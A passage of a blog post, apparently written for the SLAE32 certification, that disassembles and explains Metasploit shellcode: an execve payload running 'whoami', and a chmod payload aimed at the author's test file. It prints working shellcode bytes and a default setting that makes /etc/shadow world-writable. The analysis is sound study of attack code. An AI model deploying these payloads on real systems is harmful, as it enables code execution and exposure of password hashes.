</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000017</span>  <span style="color:#ae81ff">52</span>                push edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000018</span>  E807000000        call 0x24
</span></span><span style="display:flex;"><span>0000001D  <span style="color:#ae81ff">7768</span>              ja 0x87
</span></span><span style="display:flex;"><span>0000001F  6F                outsd
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000020</span>  <span style="color:#ae81ff">61</span>                popa
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000021</span>  6D                insd
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000022</span>  6900575389E1      imul eax,<span style="color:#f92672">[</span>eax<span style="color:#f92672">]</span>,dword 0xe1895357
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000028</span>  CD80              int 0x80
</span></span></code></pre></div><p>using awk to filter the output just for the asse,bly instructions:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo -ne <span style="color:#e6db74">&#34;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x07\x00\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x57\x53\x89\xe1\xcd\x80&#34;</span> | ndisasm -u - | awk <span style="color:#e6db74">&#39;{ print $3,$4,$5 }&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>---------------------------------------
</span></span><span style="display:flex;"><span>push byte +0xb	        ; push execve syscall number to stack
</span></span><span style="display:flex;"><span>pop eax 		        ; puts 0xb in eax. A trick to put a value into a register without using the mov instruction
</span></span><span style="display:flex;"><span>cdq  	                ; Zeroes edx. Already used this is the first assigments
</span></span><span style="display:flex;"><span>push edx 	            ; push null to the stack
</span></span><span style="display:flex;"><span>push word 0x632d	    ; pushing the string <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;-c&#39;</span> onto the stack which will be used along with <span style="color:#e6db74">&#39;/bin/sh&#39;</span> to specify <span style="color:#e6db74">&#39;whoami&#39;</span> command  
</span></span><span style="display:flex;"><span>mov edi,esp 		    ; store a stack pointer in edi to be used as an argument to execve
</span></span><span style="display:flex;"><span>push dword 0x68732f
</span></span><span style="display:flex;"><span>push dword 0x6e69622f	; pushing <span style="color:#e6db74">&#39;/bin/sh&#39;</span> onto the stack  
</span></span><span style="display:flex;"><span>mov ebx,esp 		    ; storing the stack pointer to ebx. To be used as an argument to execve as well
</span></span><span style="display:flex;"><span>push edx 		        ; push null to the stack
</span></span><span style="display:flex;"><span>call 0x24 			    ; call here to the instruction at 0x20 which is <span style="color:#e6db74">&#39;push edi&#39;</span> which we stored our stack pointer in  
</span></span><span style="display:flex;"><span>ja 0x87 
</span></span><span style="display:flex;"><span>outsd  
</span></span><span style="display:flex;"><span>popa  
</span></span><span style="display:flex;"><span>insd  
</span></span><span style="display:flex;"><span>imul eax,<span style="color:#f92672">[</span>eax<span style="color:#f92672">]</span>,dword 0xe1895357
</span></span><span style="display:flex;"><span>int 0x80 
</span></span><span style="display:flex;"><span>---------------------------------------------------
</span></span></code></pre></div><h5 id="call-0x24">call 0x24<a hidden class="anchor" aria-hidden="true" href="#call-0x24">#</a></h5>
<p>To understand better what this instruction is doing, i disassembled the shellcode in gdb. Looking to the calling address, it is calling to the &lsquo;middle&rsquo; of imul instruction which translates to <code>push edi</code>. By pushing edi we putting in the stack what we&rsquo;ve stored there previously.</p>
<p><img loading="lazy" src="/slae32/5/exec/image2.png#center" alt="call 0x24"  title="call 0x24"  />
</p>
<p>The instructions <code>ja 0x87, outsd, popa, insd and imul eax,[eax],dword 0xe1895357</code> hide a very clever way to put our command (whoami) onto the stack.</p>
<p>Checking the ndisasm output:</p>
<ul>
<li>0000001D  <code>7768</code>              ja 0x87</li>
<li>0000001F  <code>6F</code>                outsd</li>
<li>00000020  <code>61</code>                popa</li>
<li>00000021  <code>6D</code>                insd</li>
<li>00000022  <code>6900575389E1</code>      imul eax,[eax],dword 0xe1895357</li>
</ul>
<blockquote>
<p>Can we relate this behaviour on how ROP (Return Oriented Programming) gadgets are found in a binary? :)</p>
</blockquote>
<p>If we convert the bold hex bytes we see <code>whoami</code> magically appear followed by a <code>null byte (00)</code>.</p>
<p>From cyberchef:</p>
<p><img loading="lazy" src="/slae32/5/exec/image3.png#center" alt="whoami"  title="whoami"  />
</p>
<blockquote>
<p>And how this string in pushed onto the stack?</p>
</blockquote>
<p>Calling conventions is the answer. The <code>call</code> instruction will push the next instruction address to the stack. Similar to <code>JMP-CALL-POP technique</code>. That&rsquo;s how our command is placed onto the stack.</p>
<p>The final result of the instruction <code>call 0x24</code> is to push the address of whoami address first (calling convention), and then push edi to the stack.</p>
<p>This way the stack is properly ordered as:</p>
<pre tabindex="0"><code>0x632d 			; -c
0x77686f616d6900 	; whoam
</code></pre><p>But that&rsquo;s not all. We need to know what are the last two bytes (<strong>89E1</strong>) from <code>6900575389E1   imul eax,[eax],dword 0xe1895357</code> purpose.</p>
<p>Using this online <a href="https://defuse.ca/online-x86-assembler.htm">disassembler</a> those instructions are translated to:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">esp</span>
</span></span></code></pre></div><p><img loading="lazy" src="/slae32/5/exec/image4.png#center" alt="mov ecx, esp"  title="mov ecx, esp"  />
</p>
<p>We mov the address pointed by the top of the stack ecx which is the second argument for exec syscall. The same way passes to the stack the the command <code>'/bin/sh -c whoami'</code>.</p>
<p>After this, all argumets are pushed onto the stack. Just left execute the syscall with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
</span></span></code></pre></div><h2 id="shellcode-3---linuxx86chmod">Shellcode 3 - linux/x86/chmod<a hidden class="anchor" aria-hidden="true" href="#shellcode-3---linuxx86chmod">#</a></h2>
<hr>
<p>The last shellcode is <code>linux/x86/chmod</code>. Checking its arguments in msfvenom.</p>
<p><code>msfvenom -p linux/x86/chmod --list-options</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ msfvenom -p linux/x86/chmod --list-options
</span></span><span style="display:flex;"><span>Options <span style="color:#66d9ef">for</span> payload/linux/x86/chmod:
</span></span><span style="display:flex;"><span><span style="color:#f92672">=========================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       Name: Linux Chmod
</span></span><span style="display:flex;"><span>     Module: payload/linux/x86/chmod
</span></span><span style="display:flex;"><span>   Platform: Linux
</span></span><span style="display:flex;"><span>       Arch: x86
</span></span><span style="display:flex;"><span>Needs Admin: No
</span></span><span style="display:flex;"><span> Total size: <span style="color:#ae81ff">36</span>
</span></span><span style="display:flex;"><span>       Rank: Normal
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Provided by:
</span></span><span style="display:flex;"><span>    kris katterjohn &lt;katterjohn@gmail.com&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Basic options:
</span></span><span style="display:flex;"><span>Name  Current Setting  Required  Description
</span></span><span style="display:flex;"><span>----  ---------------  --------  -----------
</span></span><span style="display:flex;"><span>FILE  /etc/shadow      yes       Filename to chmod
</span></span><span style="display:flex;"><span>MODE  <span style="color:#ae81ff">0666</span>             yes       File mode <span style="color:#f92672">(</span>octal<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Description:
</span></span><span style="display:flex;"><span>  Runs chmod on specified file with specified mode
</span></span></code></pre></div><p>So this has two options we have to provide. The file that we want to alter, and the and the chmod mode we want to make it. I will create a file within <code>~/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis</code> directory, and <code>chmod</code> it to be an executable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>-r--r----- <span style="color:#ae81ff">1</span> edu edu <span style="color:#ae81ff">0</span> Nov <span style="color:#ae81ff">24</span> 14:23 test.txt
</span></span></code></pre></div><p><img loading="lazy" src="/slae32/5/chmod/image3.png" alt="test.txt permissions"  title="test.txt permissions"  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo msfvenom -p linux/x86/chmod FILE<span style="color:#f92672">=</span>/home/edu/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis/test.txt MODE<span style="color:#f92672">=</span><span style="color:#ae81ff">0777</span> -f c  
</span></span></code></pre></div><p>Output:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ msfvenom -p linux/x86/chmod FILE<span style="color:#f92672">=</span>/home/edu/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis/test.txt MODE<span style="color:#f92672">=</span><span style="color:#ae81ff">0777</span> -f c  
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">98</span> bytes
</span></span><span style="display:flex;"><span>Final size of c file: <span style="color:#ae81ff">437</span> bytes
</span></span><span style="display:flex;"><span>unsigned char buf<span style="color:#f92672">[]</span> <span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x99\x6a\x0f\x58\x52\xe8\x4a\x00\x00\x00\x2f\x68\x6f\x6d&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x65\x2f\x65\x64\x75\x2f\x44\x65\x73\x6b\x74\x6f\x70\x2f&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x73\x6c\x61\x65\x5f\x78\x38\x36\x2f\x61\x73\x73\x69\x67&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x6e\x6d\x65\x6e\x74\x73\x2f\x35\x2d\x4d\x53\x46\x5f\x53&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x68\x65\x6c\x6c\x63\x6f\x64\x65\x73\x5f\x41\x6e\x61\x6c&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x79\x73\x69\x73\x2f\x74\x65\x73\x74\x2e\x74\x78\x74\x00&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x5b\x68\xff\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80&#34;</span>;
</span></span></code></pre></div><h6 id="ndisasm"><a hidden class="anchor" aria-hidden="true" href="#ndisasm">#</a></h6>
<p>Using ndisasm:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo -ne <span style="color:#e6db74">&#34;\x99\x6a\x0f\x58\x52\xe8\x4a\x00\x00\x00\x2f\x68\x6f\x6d\x65\x2f\x65\x64\x75\x2f\x44\x65\x73\x6b\x74\x6f\x70\x2f\x73\x6c\x61\x65\x5f\x78\x38\x36\x2f\x61\x73\x73\x69\x67\x6e\x6d\x65\x6e\x74\x73\x2f\x35\x2d\x4d\x53\x46\x5f\x53\x68\x65\x6c\x6c\x63\x6f\x64\x65\x73\x5f\x41\x6e\x61\x6c\x79\x73\x69\x73\x2f\x74\x65\x73\x74\x2e\x74\x78\x74\x00\x5b\x68\xff\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80&#34;</span> | ndisasm -u -
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">99</span>                cdq
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span>  6A0F              push byte +0xf
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000003</span>  <span style="color:#ae81ff">58</span>                pop eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000004</span>  <span style="color:#ae81ff">52</span>                push edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000005</span>  E84A000000        call 0x54
</span></span><span style="display:flex;"><span>0000000A  2F                das
</span></span><span style="display:flex;"><span>0000000B  686F6D652F        push dword 0x2f656d6f
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000010</span>  6564752F          fs jnz 0x43
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000014</span>  <span style="color:#ae81ff">44</span>                inc esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000015</span>  65736B            gs jnc 0x83
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000018</span>  746F              jz 0x89
</span></span><span style="display:flex;"><span>0000001A  702F              jo 0x4b
</span></span><span style="display:flex;"><span>0000001C  736C              jnc 0x8a
</span></span><span style="display:flex;"><span>0000001E  <span style="color:#ae81ff">61</span>                popa
</span></span><span style="display:flex;"><span>0000001F  655F              gs pop edi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000021</span>  <span style="color:#ae81ff">7838</span>              js 0x5b
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000023</span>  362F              ss das
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000025</span>  <span style="color:#ae81ff">61</span>                popa
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000026</span>  <span style="color:#ae81ff">7373</span>              jnc 0x9b
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000028</span>  69676E6D656E74    imul esp,<span style="color:#f92672">[</span>edi+0x6e<span style="color:#f92672">]</span>,dword 0x746e656d
</span></span><span style="display:flex;"><span>0000002F  732F              jnc 0x60
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000031</span>  352D4D5346        xor eax,0x46534d2d
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000036</span>  5F                pop edi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000037</span>  <span style="color:#ae81ff">53</span>                push ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000038</span>  68656C6C63        push dword 0x636c6c65
</span></span><span style="display:flex;"><span>0000003D  6F                outsd
</span></span><span style="display:flex;"><span>0000003E  6465735F          gs jnc 0xa1
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000042</span>  <span style="color:#ae81ff">41</span>                inc ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000043</span>  6E                outsb
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000044</span>  <span style="color:#ae81ff">61</span>                popa
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000045</span>  6C                insb
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000046</span>  <span style="color:#ae81ff">7973</span>              jns 0xbb
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000048</span>  69732F74657374    imul esi,<span style="color:#f92672">[</span>ebx+0x2f<span style="color:#f92672">]</span>,dword 0x74736574
</span></span><span style="display:flex;"><span>0000004F  2E7478            cs jz 0xca
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000052</span>  <span style="color:#ae81ff">7400</span>              jz 0x54
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000054</span>  5B                pop ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000055</span>  68FF010000        push dword 0x1ff
</span></span><span style="display:flex;"><span>0000005A  <span style="color:#ae81ff">59</span>                pop ecx
</span></span><span style="display:flex;"><span>0000005B  CD80              int 0x80
</span></span><span style="display:flex;"><span>0000005D  6A01              push byte +0x1
</span></span><span style="display:flex;"><span>0000005F  <span style="color:#ae81ff">58</span>                pop eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000060</span>  CD80              int 0x80
</span></span></code></pre></div><p>Filtering just by the assembly instruction with awk. The output is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo -ne <span style="color:#e6db74">&#34;\x99\x6a\x0f\x58\x52\xe8\x4a\x00\x00\x00\x2f\x68\x6f\x6d\x65\x2f\x65\x64\x75\x2f\x44\x65\x73\x6b\x74\x6f\x70\x2f\x73\x6c\x61\x65\x5f\x78\x38\x36\x2f\x61\x73\x73\x69\x67\x6e\x6d\x65\x6e\x74\x73\x2f\x35\x2d\x4d\x53\x46\x5f\x53\x68\x65\x6c\x6c\x63\x6f\x64\x65\x73\x5f\x41\x6e\x61\x6c\x79\x73\x69\x73\x2f\x74\x65\x73\x74\x2e\x74\x78\x74\x00\x5b\x68\xff\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80&#34;</span> | ndisasm -u - | awk <span style="color:#e6db74">&#39;{print $3,$4,$5}&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cdq  					; zeroes edx
</span></span><span style="display:flex;"><span>push byte +0xf			; push 0xf --&gt; chmod syscall number
</span></span><span style="display:flex;"><span>pop eax 				; put 0xf in eax
</span></span><span style="display:flex;"><span>push edx 				; push a null onto the stack  
</span></span><span style="display:flex;"><span>call 0x54 				; pushes next instruction address <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;push dword 0x2f656d6f&#34;</span><span style="color:#f92672">)</span> and jumps execution to the instruction placed 0x54 bytes relative to the start of the shellcode  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;; start of the test.txt path bytes&#34;</span>
</span></span><span style="display:flex;"><span>das  
</span></span><span style="display:flex;"><span>push dword 0x2f656d6f
</span></span><span style="display:flex;"><span>fs jnz 0x43
</span></span><span style="display:flex;"><span>inc esp 
</span></span><span style="display:flex;"><span>gs jnc 0x83
</span></span><span style="display:flex;"><span>jz 0x89 
</span></span><span style="display:flex;"><span>jo 0x4b 
</span></span><span style="display:flex;"><span>jnc 0x8a 
</span></span><span style="display:flex;"><span>popa  
</span></span><span style="display:flex;"><span>gs pop edi
</span></span><span style="display:flex;"><span>js 0x5b 
</span></span><span style="display:flex;"><span>ss das 
</span></span><span style="display:flex;"><span>popa  
</span></span><span style="display:flex;"><span>jnc 0x9b 
</span></span><span style="display:flex;"><span>imul esp,<span style="color:#f92672">[</span>edi+0x6e<span style="color:#f92672">]</span>,dword 0x746e656d
</span></span><span style="display:flex;"><span>jnc 0x60 
</span></span><span style="display:flex;"><span>xor eax,0x46534d2d 
</span></span><span style="display:flex;"><span>pop edi 
</span></span><span style="display:flex;"><span>push ebx 
</span></span><span style="display:flex;"><span>push dword 0x636c6c65
</span></span><span style="display:flex;"><span>outsd  
</span></span><span style="display:flex;"><span>gs jnc 0xa1
</span></span><span style="display:flex;"><span>inc ecx 
</span></span><span style="display:flex;"><span>outsb  
</span></span><span style="display:flex;"><span>popa  
</span></span><span style="display:flex;"><span>insb  
</span></span><span style="display:flex;"><span>jns 0xbb 
</span></span><span style="display:flex;"><span>imul esi,<span style="color:#f92672">[</span>ebx+0x2f<span style="color:#f92672">]</span>,dword 0x74736574
</span></span><span style="display:flex;"><span>cs jz 0xca
</span></span><span style="display:flex;"><span>jz 0x54 
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;end of test.txt string bytes&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;; start of decode stub&#34;</span>
</span></span><span style="display:flex;"><span>pop ebx
</span></span><span style="display:flex;"><span>push dword 0x1ff
</span></span><span style="display:flex;"><span>pop ecx
</span></span><span style="display:flex;"><span>int 0x80
</span></span><span style="display:flex;"><span>push byte +0x1
</span></span><span style="display:flex;"><span>pop eax
</span></span><span style="display:flex;"><span>int 0x80
</span></span></code></pre></div><p>This instructions purpose are not to be &ldquo;real&rdquo; instructions or obfuscated code. It&rsquo;s simply <code>/home/eduardo/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis/test.txt</code> string bytes that were placed in memory which represent the correpondent assembly instructions.</p>
<p><img loading="lazy" src="/slae32/5/chmod/image4.png#center" alt="test.txt path"  title="test.txt path"  />
</p>
<p>Moving to 0x54 bytes from the beggining, we jmp to the instruction <code>pop ebx</code>. This is where the decode stub is placed.</p>
<p>You can check the first <a href="#ndisasm">ndisasm</a> output and see</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#ae81ff">00000054</span>  5B   pop ebx
</span></span></code></pre></div><p>From there, file path bytes are decoded and <code>chmod</code> is executed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">ebx</span> 							<span style="color:#75715e">; execution is redirected to here. Store stack pointers of /home/eduardo/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis/test.txt in ebx (1st arg)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">dword</span> <span style="color:#ae81ff">0x1ff</span>					<span style="color:#75715e">; pushes the permissions or MODE parameter to be changed in the file pointed by ebx. 0x1ff (hex) = 777 (octal)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">ecx</span> 							<span style="color:#75715e">; stores 0x1ff in ecx which is the 2chmod&#39;s 2nd arg
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span> 							<span style="color:#75715e">; calls chmod
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">byte</span> <span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x1</span>					<span style="color:#75715e">; pushes onto the stack the exit syscalll number
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">eax</span> 							<span style="color:#75715e">; stores x01 in eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>							<span style="color:#75715e">; calls exit
</span></span></span></code></pre></div><h2 id="lessons-learned">Lessons learned<a hidden class="anchor" aria-hidden="true" href="#lessons-learned">#</a></h2>
<p>The best trick I saw was to place string bytes as assembly  isntructions and then decode them in runtime. In fact, is similar to the encoder lesson from the course but the methodology is applied in a different way.</p>
<p>An example on how to think <code>outside the box</code> and how we cane be creative if we put some effort on that.</p>
<p>A apart from that, the shellcodes had many null-bytes but the real outcome how after doing the full analysis of the shellcodes in this blog post. My curiosity talk louder and I tried generating these payloads using null bytes as badchars.</p>
<p>For my surprise, I noticed some of the null bytes were being introducing by local jumps using the call instruction with <code>jmp-call-pop</code> technique. This technique was replaced by the <code>fnstenv</code> technique which was mentioned in one of the challenges placed during the course.</p>
<p>This way we can store the address of the next instruction in the <code>FPU stack</code> and avoid introducing null bytes with call instruction.</p>
<blockquote>
<p>The most important one: this assignment remembered me how <code>we can learn from reading not just shellcode but any code from other languages written by others</code>.</p>
<p>A lesson that we can apply to any other task in other area (hardware, cooking, communication, etc).</p>
<p>Doing that we can learn new techniques, new ways to think when we face a problem and be more efficient <code>in any task during our life</code>.</p>
</blockquote>
<hr>
<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
<p><code>Student ID: PA-31319</code></p>
<p>All the source code files are available on GitHub at <a href="https://github.com/0xnibbles/slae_x86">https://github.com/0xnibbles/slae_x86</a></p>
<hr>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://0xnibbles.github.io/tags/slae32/">slae32</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://0xnibbles.github.io/posts/slae_32_assignment_6/">
    <span class="title">« Prev</span>
    <br>
    <span>SLAE32 Assignment 6 - Polymorphic Shellcode</span>
  </a>
  <a class="next" href="https://0xnibbles.github.io/posts/slae_32_assignment_4/">
    <span class="title">Next »</span>
    <br>
    <span>SLAE32 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)</span>
  </a>
</nav>


<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE32 Assignment 5 - Msfvenom Shellcode Analysis on twitter"
        href="https://twitter.com/intent/tweet/?text=SLAE32%20Assignment%205%20-%20Msfvenom%20Shellcode%20Analysis&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae_32_assignment_5%2f&amp;hashtags=slae32">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE32 Assignment 5 - Msfvenom Shellcode Analysis on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae_32_assignment_5%2f&amp;title=SLAE32%20Assignment%205%20-%20Msfvenom%20Shellcode%20Analysis&amp;summary=SLAE32%20Assignment%205%20-%20Msfvenom%20Shellcode%20Analysis&amp;source=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae_32_assignment_5%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
</div>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="https://0xnibbles.github.io/">nibbles</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
